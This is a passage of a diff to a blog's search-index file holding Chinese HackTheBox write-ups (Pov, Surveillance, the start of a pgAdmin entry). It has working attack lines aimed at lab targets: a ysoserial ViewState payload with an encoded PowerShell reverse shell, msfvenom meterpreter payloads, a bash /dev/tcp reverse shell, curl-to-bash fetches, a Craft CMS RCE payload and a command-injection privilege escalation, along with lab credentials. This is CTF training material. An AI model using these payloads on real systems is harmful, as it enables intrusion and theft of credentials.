-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAA2ACIALAAxADAAMgA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&quot; --apppath=&quot;/&quot; --path=&quot;/portfolio/default.aspx&quot; --decryptionalg=&quot;AES&quot; --decryptionkey=&quot;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&quot;</span><br></pre></td></tr></table></figure>
-
-<p>成功反弹shell</p>
-<p><img src="/article/Pov-HackTheBox/image-20240405194432185.png"></p>
-<p>经过一番查找在<code>C:\Users\sfitz\Documents</code>路径下发现有用信息</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Objs Version=&quot;1.1.0.1&quot; xmlns=&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&gt;</span><br><span class="line">  &lt;Obj RefId=&quot;0&quot;&gt;</span><br><span class="line">    &lt;TN RefId=&quot;0&quot;&gt;</span><br><span class="line">      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;</span><br><span class="line">      &lt;T&gt;System.Object&lt;/T&gt;</span><br><span class="line">    &lt;/TN&gt;</span><br><span class="line">    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;</span><br><span class="line">    &lt;Props&gt;</span><br><span class="line">      &lt;S N=&quot;UserName&quot;&gt;alaading&lt;/S&gt;</span><br><span class="line">      &lt;SS N=&quot;Password&quot;&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6&lt;/SS&gt;</span><br><span class="line">    &lt;/Props&gt;</span><br><span class="line">  &lt;/Obj&gt;</span><br><span class="line">&lt;/Objs&gt;</span><br></pre></td></tr></table></figure>
-
-<p>利用powershell语法解密将password转换成明文 <a href="https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters#secure-string-to-plaintext">参考文章</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$cred = Import-CliXml -Path connection.xml; $cred.GetNetworkCredential() | Format-List *</span><br></pre></td></tr></table></figure>
-
-<p>成功得到密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\sfitz\Documents&gt; $cred = Import-CliXml -Path connection.xml; $cred.GetNetworkCredential() | Format-List *</span><br><span class="line">UserName       : alaading</span><br><span class="line">Password       : f8gQ8fynP44ek1m3</span><br><span class="line">SecurePassword : System.Security.SecureString</span><br><span class="line">Domain         : </span><br></pre></td></tr></table></figure>
-
-<p>接下来我们使用RunasCs进行用户切换</p>
-<p>首先切换到Downloads目录，然后下载本地的RunasCs文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://10.10.14.46/RunasCs.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Pov-HackTheBox/image-20240405200822175.png"></p>
-<p>然后切换用户并弹shell到777端口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./RunasCs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r 10.10.14.46:777</span><br></pre></td></tr></table></figure>
-
-<p>重点：这里用<code>powershell</code>弹，如果用<code>cmd.exe</code>到后面会发现没有<code>SeDebugPrivilege</code>权限</p>
-<p><img src="/article/Pov-HackTheBox/image-20240405200949897.png"></p>
-<p>得到user的flag</p>
-<p><img src="/article/Pov-HackTheBox/image-20240405201600635.png"></p>
-<p>查看下当前用户权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Windows\system32&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State   </span><br><span class="line">============================= ============================== ========</span><br><span class="line">SeDebugPrivilege              Debug programs                 Enabled </span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled </span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</span><br></pre></td></tr></table></figure>
-
-<p><strong>SeDebugPrivilege</strong></p>
-<blockquote>
-<p>在Windows操作系统中，SeDebugPrivilege是一种特别强大的权限，可以让持有该权限的进程读取或修改几乎所有其他进程的内存空间，即使是那些以系统或管理员级别运行的进程。在Metasploit框架下，拥有了这个权限，就可以对系统的SAM数据库进行读取</p>
-</blockquote>
-<p>由于靶机<code>SeDebugPrivilege</code>是<code>enabled</code>，所以我们就直接提权就行了</p>
-<p>若要启动该权限，需要执行下面脚本 <a href="https://book.hacktricks.xyz/v/cn/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#qi-yong-suo-you-ling-pai">参考文章</a></p>
-<p>EnableAllTokenPrivs.ps1</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## All Credit goes to Lee Holmes (@Lee_Holmes on twitter).  I found the code here https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/</span><br><span class="line">$definition = @&#x27;</span><br><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line">namespace Set_TokenPermission</span><br><span class="line">&#123;</span><br><span class="line">    public class SetTokenPriv</span><br><span class="line">    &#123;</span><br><span class="line">        [DllImport(&quot;advapi32.dll&quot;, ExactSpelling = true, SetLastError = true)]</span><br><span class="line">        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,</span><br><span class="line">        ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);</span><br><span class="line">        [DllImport(&quot;advapi32.dll&quot;, ExactSpelling = true, SetLastError = true)]</span><br><span class="line">        internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);</span><br><span class="line">        [DllImport(&quot;advapi32.dll&quot;, SetLastError = true)]</span><br><span class="line">        internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);</span><br><span class="line">        [StructLayout(LayoutKind.Sequential, Pack = 1)]</span><br><span class="line">        internal struct TokPriv1Luid</span><br><span class="line">        &#123;</span><br><span class="line">            public int Count;</span><br><span class="line">            public long Luid;</span><br><span class="line">            public int Attr;</span><br><span class="line">        &#125;</span><br><span class="line">        internal const int SE_PRIVILEGE_ENABLED = 0x00000002;</span><br><span class="line">        internal const int SE_PRIVILEGE_DISABLED = 0x00000000;</span><br><span class="line">        internal const int TOKEN_QUERY = 0x00000008;</span><br><span class="line">        internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;</span><br><span class="line">        public static void EnablePrivilege()</span><br><span class="line">        &#123;</span><br><span class="line">            bool retVal;</span><br><span class="line">            TokPriv1Luid tp;</span><br><span class="line">            IntPtr hproc = new IntPtr();</span><br><span class="line">            hproc = Process.GetCurrentProcess().Handle;</span><br><span class="line">            IntPtr htok = IntPtr.Zero;</span><br><span class="line"></span><br><span class="line">            List&lt;string&gt; privs = new List&lt;string&gt;() &#123;  &quot;SeAssignPrimaryTokenPrivilege&quot;, &quot;SeAuditPrivilege&quot;, &quot;SeBackupPrivilege&quot;,</span><br><span class="line">            &quot;SeChangeNotifyPrivilege&quot;, &quot;SeCreateGlobalPrivilege&quot;, &quot;SeCreatePagefilePrivilege&quot;,</span><br><span class="line">            &quot;SeCreatePermanentPrivilege&quot;, &quot;SeCreateSymbolicLinkPrivilege&quot;, &quot;SeCreateTokenPrivilege&quot;,</span><br><span class="line">            &quot;SeDebugPrivilege&quot;, &quot;SeEnableDelegationPrivilege&quot;, &quot;SeImpersonatePrivilege&quot;, &quot;SeIncreaseBasePriorityPrivilege&quot;,</span><br><span class="line">            &quot;SeIncreaseQuotaPrivilege&quot;, &quot;SeIncreaseWorkingSetPrivilege&quot;, &quot;SeLoadDriverPrivilege&quot;,</span><br><span class="line">            &quot;SeLockMemoryPrivilege&quot;, &quot;SeMachineAccountPrivilege&quot;, &quot;SeManageVolumePrivilege&quot;,</span><br><span class="line">            &quot;SeProfileSingleProcessPrivilege&quot;, &quot;SeRelabelPrivilege&quot;, &quot;SeRemoteShutdownPrivilege&quot;,</span><br><span class="line">            &quot;SeRestorePrivilege&quot;, &quot;SeSecurityPrivilege&quot;, &quot;SeShutdownPrivilege&quot;, &quot;SeSyncAgentPrivilege&quot;,</span><br><span class="line">            &quot;SeSystemEnvironmentPrivilege&quot;, &quot;SeSystemProfilePrivilege&quot;, &quot;SeSystemtimePrivilege&quot;,</span><br><span class="line">            &quot;SeTakeOwnershipPrivilege&quot;, &quot;SeTcbPrivilege&quot;, &quot;SeTimeZonePrivilege&quot;, &quot;SeTrustedCredManAccessPrivilege&quot;,</span><br><span class="line">            &quot;SeUndockPrivilege&quot;, &quot;SeUnsolicitedInputPrivilege&quot;, &quot;SeDelegateSessionUserImpersonatePrivilege&quot; &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);</span><br><span class="line">            tp.Count = 1;</span><br><span class="line">            tp.Luid = 0;</span><br><span class="line">            tp.Attr = SE_PRIVILEGE_ENABLED;</span><br><span class="line"></span><br><span class="line">            foreach (var priv in privs)</span><br><span class="line">            &#123;</span><br><span class="line">                retVal = LookupPrivilegeValue(null, priv, ref tp.Luid);</span><br><span class="line">                retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);                              </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">&#x27;@</span><br><span class="line"></span><br><span class="line">$type = Add-Type $definition -PassThru</span><br><span class="line">$type[0]::EnablePrivilege() 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-<p>在本地开启http服务上传该脚本文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://10.10.14.46/EnableAllTokenPrivs.ps1</span><br></pre></td></tr></table></figure>
-
-<p>然后<code>.\EnableAllTokenPrivs.ps1</code>即可</p>
-<p>回到题目，我们利用msf先在本地生成马</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.46 LPORT=5555 -f exe &gt; exploit.exe</span><br></pre></td></tr></table></figure>
-
-<p>然后本地开启http服务，上传到靶机</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://10.10.14.46/exploit.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Pov-HackTheBox/image-20240405203424722.png"></p>
-<p>在本地启动一个msf数据库&amp;console</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo msfdb init &amp;&amp; msfconsole</span><br></pre></td></tr></table></figure>
-
-<p>接着依次执行去反弹shell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 10.10.14.46</span><br><span class="line">set LPORT 5555</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p>开启监听后在靶机运行<code>.\exploit.exe</code>，反弹成功</p>
-<p><img src="/article/Pov-HackTheBox/image-20240406124840953.png"></p>
-<p>我们<code>ps</code>查看下靶机正在运行的进程，注意到<code>winlogon.exe</code>文件</p>
-<blockquote>
-<p>winlogon.exe 是 Windows 的登录系统进程，它在用户登录时启动，并处理用户登录和注销的过程。当用户输入用户名和密码后，winlogon.exe 验证用户的凭据，并启动用户环境。它还负责加载用户配置文件、启动用户的用户界面和其他关联的系统任务。</p>
-</blockquote>
-<p><img src="/article/Pov-HackTheBox/image-20240406125030326.png"></p>
-<p>然后使用<code>migrate 548</code>命令将shell移到winlogon.exe进程里</p>
-<p>执行shell命令，成功提权拿到flag</p>
-<p><img src="/article/Pov-HackTheBox/image-20240406125219057.png"></p>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>HackTheBox</tag>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SolarLab-HackTheBox</title>
     <url>/article/SolarLab-HackTheBox.html</url>
     <content><![CDATA[<p>SMB共享文件获取敏感信息、Python Reportlab 代码注入漏洞、Openfire身份认证绕过漏洞</p>
@@ -2088,6 +2090,95 @@
       </tags>
   </entry>
   <entry>
+    <title>Surveillance-HackTheBox</title>
+    <url>/article/Surveillance-HackTheBox.html</url>
+    <content><![CDATA[<p>CVE-2023-41892、CVE-2023-26035</p>
+<span id="more"></span>
+
+<h1 id="Surveillance-HackTheBox"><a href="#Surveillance-HackTheBox" class="headerlink" title="Surveillance-HackTheBox"></a>Surveillance-HackTheBox</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v -p- --min-rate 1000 10.10.11.245</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Surveillance-HackTheBox/image-20240111180818681.png"></p>
+<p>扫出来两个端口，其中80端口有http服务并且重定向到surveillance.htb</p>
+<p>那么我们添加下域名然后访问80端口，发现是企业网站尝试扫描子域名和目录无果后，用Wappalyzer插件看看</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111184949465.png"></p>
+<p>得知是Craft CMS后，去网上搜一下发现存在远程代码执行漏洞(CVE-2023-41892) <a href="https://cloud.tencent.com/developer/article/2365764?areaId=106001">参考文章</a></p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">action=conditions/render&amp;test[userCondition]=craft\elements\conditions\users\UserCondition&amp;config=&#123;&quot;name&quot;:&quot;test[userCondition]&quot;,&quot;as xyz&quot;:&#123;&quot;class&quot;:&quot;\\GuzzleHttp\\Psr7\\FnStream&quot;,    &quot;__construct()&quot;: [&#123;&quot;close&quot;:null&#125;],&quot;_fn_close&quot;:&quot;phpinfo&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>抓包修改为POST请求，添加payload成功RCE</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111185214507.png"></p>
+<p>仔细分析此payload的执行过程，原来是调用call_user_func函数只有一个参数，想反弹shell就卡住了</p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>我在GitHub上找到写好的getshell脚本 <a href="https://github.com/Faelian/CraftCMS_CVE-2023-41892">脚本链接</a></p>
+<p>成功反弹</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111194741978.png"></p>
+<p>由于不稳定，我们反弹到自己机子上</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.74/1028 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Surveillance-HackTheBox/image-20240111195321224.png"></p>
+<p>我们注意到<code>/craft/storage/backups</code>目录下有zip文件</p>
+<p>先开启http服务，用wget下载下来查看</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111200833565.png"></p>
+<p>解压后打开看发现有信息泄露</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111201305915.png"></p>
+<p>直接拿join爆破一下，结果出现报错，提示使用其他哈希类型</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111203634494.png"></p>
+<p>最终在类型为Raw-SHA256爆破成功得到密码</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111203654261.png"></p>
+<p>知道密码后我们直接ssh连接（这里是用户matthew）</p>
+<p>得到user的flag</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111211630770.png"></p>
+<p>然后就没有收获了，于是我们决定进行更深层的探测潜在的特权提升路径和漏洞</p>
+<p>使用工具LinPEAS，我们现在本地开启http服务，然后使用curl命令去弹</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://10.10.14.74:8000/linpeas.sh | bash</span><br></pre></td></tr></table></figure>
+
+<p>成功得到连接数据库的密码</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111214133572.png"></p>
+<p>当然也可以得到用户名</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111214620372.png"></p>
+<p>然后就进行mysql连接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u craftuser -p -h localhost</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Surveillance-HackTheBox/image-20240111214901316.png"></p>
+<p>然后在craftdb中的users表找到admin的相关信息</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111215203687.png"></p>
+<p>使用john爆破失败</p>
+<p>回头继续分析，发现8080端口开放</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111215950995.png"></p>
+<p>那么我们使用ssh进行端口转发至本地的777端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -L 777:localhost:8080 matthew@10.10.11.245</span><br></pre></td></tr></table></figure>
+
+<p>然后在浏览器访问本地777端口，发现是ZoneMinder</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111220606278.png"></p>
+<p>网上搜到ZoneMinder 代码执行漏洞(CVE-2023-26035)</p>
+<p>GitHub上有现成的poc <a href="https://github.com/rvizx/CVE-2023-26035">参考链接</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 exploit.py -t http://localhost:777/ -ip 10.10.14.74 -p</span><br></pre></td></tr></table></figure>
+
+<p>本地转发的777端口为target，然后1028为nc监听的端口</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>连接到后<code>sudo -l</code>看看可执行的命令</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111223721833.png"></p>
+<p>下面这些二进制文件都可以执行，参考其他师傅wp可以知道在zmupdate.pl文件存在漏洞</p>
+<p>具体是指参数user的值可以为文件，那么我们可以上传shell脚本然后利用其user参数实现getshell</p>
+<p>过程如下，写入并赋予suid可执行权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;cp /bin/bash /var/tmp/bash;chmod 4755 /var/tmp/bash&#x27; &gt; /var/tmp/exploit.sh</span><br><span class="line">chmod +x /var/tmp/exploit.sh</span><br></pre></td></tr></table></figure>
+
+<p>然后再执行刚刚说的利用参数user</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/zmupdate.pl --version=1.36.32 --user=&#x27;$(/var/tmp/exploit.sh)&#x27; --pass=ZoneMinderPassword2023</span><br></pre></td></tr></table></figure>
+
+<p>执行完后我们再<code>/var/tmp/bash -p</code>得到完整的root权限</p>
+<p>得到flag</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111224745965.png"></p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>提权</tag>
+        <tag>CMS</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>TwoMillion-HackTheBox</title>
     <url>/article/TwoMillion-HackTheBox.html</url>
     <content><![CDATA[<p>OverlayFS 内核漏洞 （CVE-2023-0386）</p>
@@ -2193,95 +2284,6 @@
       <tags>
         <tag>HackTheBox</tag>
         <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Surveillance-HackTheBox</title>
-    <url>/article/Surveillance-HackTheBox.html</url>
-    <content><![CDATA[<p>CVE-2023-41892、CVE-2023-26035</p>
-<span id="more"></span>
-
-<h1 id="Surveillance-HackTheBox"><a href="#Surveillance-HackTheBox" class="headerlink" title="Surveillance-HackTheBox"></a>Surveillance-HackTheBox</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描端口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v -p- --min-rate 1000 10.10.11.245</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Surveillance-HackTheBox/image-20240111180818681.png"></p>
-<p>扫出来两个端口，其中80端口有http服务并且重定向到surveillance.htb</p>
-<p>那么我们添加下域名然后访问80端口，发现是企业网站尝试扫描子域名和目录无果后，用Wappalyzer插件看看</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111184949465.png"></p>
-<p>得知是Craft CMS后，去网上搜一下发现存在远程代码执行漏洞(CVE-2023-41892) <a href="https://cloud.tencent.com/developer/article/2365764?areaId=106001">参考文章</a></p>
-<p>payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">action=conditions/render&amp;test[userCondition]=craft\elements\conditions\users\UserCondition&amp;config=&#123;&quot;name&quot;:&quot;test[userCondition]&quot;,&quot;as xyz&quot;:&#123;&quot;class&quot;:&quot;\\GuzzleHttp\\Psr7\\FnStream&quot;,    &quot;__construct()&quot;: [&#123;&quot;close&quot;:null&#125;],&quot;_fn_close&quot;:&quot;phpinfo&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>抓包修改为POST请求，添加payload成功RCE</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111185214507.png"></p>
-<p>仔细分析此payload的执行过程，原来是调用call_user_func函数只有一个参数，想反弹shell就卡住了</p>
-<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>我在GitHub上找到写好的getshell脚本 <a href="https://github.com/Faelian/CraftCMS_CVE-2023-41892">脚本链接</a></p>
-<p>成功反弹</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111194741978.png"></p>
-<p>由于不稳定，我们反弹到自己机子上</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.74/1028 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Surveillance-HackTheBox/image-20240111195321224.png"></p>
-<p>我们注意到<code>/craft/storage/backups</code>目录下有zip文件</p>
-<p>先开启http服务，用wget下载下来查看</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111200833565.png"></p>
-<p>解压后打开看发现有信息泄露</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111201305915.png"></p>
-<p>直接拿join爆破一下，结果出现报错，提示使用其他哈希类型</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111203634494.png"></p>
-<p>最终在类型为Raw-SHA256爆破成功得到密码</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111203654261.png"></p>
-<p>知道密码后我们直接ssh连接（这里是用户matthew）</p>
-<p>得到user的flag</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111211630770.png"></p>
-<p>然后就没有收获了，于是我们决定进行更深层的探测潜在的特权提升路径和漏洞</p>
-<p>使用工具LinPEAS，我们现在本地开启http服务，然后使用curl命令去弹</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://10.10.14.74:8000/linpeas.sh | bash</span><br></pre></td></tr></table></figure>
-
-<p>成功得到连接数据库的密码</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111214133572.png"></p>
-<p>当然也可以得到用户名</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111214620372.png"></p>
-<p>然后就进行mysql连接</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u craftuser -p -h localhost</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Surveillance-HackTheBox/image-20240111214901316.png"></p>
-<p>然后在craftdb中的users表找到admin的相关信息</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111215203687.png"></p>
-<p>使用john爆破失败</p>
-<p>回头继续分析，发现8080端口开放</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111215950995.png"></p>
-<p>那么我们使用ssh进行端口转发至本地的777端口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -L 777:localhost:8080 matthew@10.10.11.245</span><br></pre></td></tr></table></figure>
-
-<p>然后在浏览器访问本地777端口，发现是ZoneMinder</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111220606278.png"></p>
-<p>网上搜到ZoneMinder 代码执行漏洞(CVE-2023-26035)</p>
-<p>GitHub上有现成的poc <a href="https://github.com/rvizx/CVE-2023-26035">参考链接</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 exploit.py -t http://localhost:777/ -ip 10.10.14.74 -p</span><br></pre></td></tr></table></figure>
-
-<p>本地转发的777端口为target，然后1028为nc监听的端口</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>连接到后<code>sudo -l</code>看看可执行的命令</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111223721833.png"></p>
-<p>下面这些二进制文件都可以执行，参考其他师傅wp可以知道在zmupdate.pl文件存在漏洞</p>
-<p>具体是指参数user的值可以为文件，那么我们可以上传shell脚本然后利用其user参数实现getshell</p>
-<p>过程如下，写入并赋予suid可执行权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;cp /bin/bash /var/tmp/bash;chmod 4755 /var/tmp/bash&#x27; &gt; /var/tmp/exploit.sh</span><br><span class="line">chmod +x /var/tmp/exploit.sh</span><br></pre></td></tr></table></figure>
-
-<p>然后再执行刚刚说的利用参数user</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/zmupdate.pl --version=1.36.32 --user=&#x27;$(/var/tmp/exploit.sh)&#x27; --pass=ZoneMinderPassword2023</span><br></pre></td></tr></table></figure>
-
-<p>执行完后我们再<code>/var/tmp/bash -p</code>得到完整的root权限</p>
-<p>得到flag</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111224745965.png"></p>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>HackTheBox</tag>
-        <tag>提权</tag>
-        <tag>CMS</tag>
       </tags>
   </entry>
   <entry>
@@ -2678,6 +2680,63 @@
       </tags>
   </entry>
   <entry>
+    <title>pgAdmin命令执行漏洞</title>
+    <url>/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html</url>
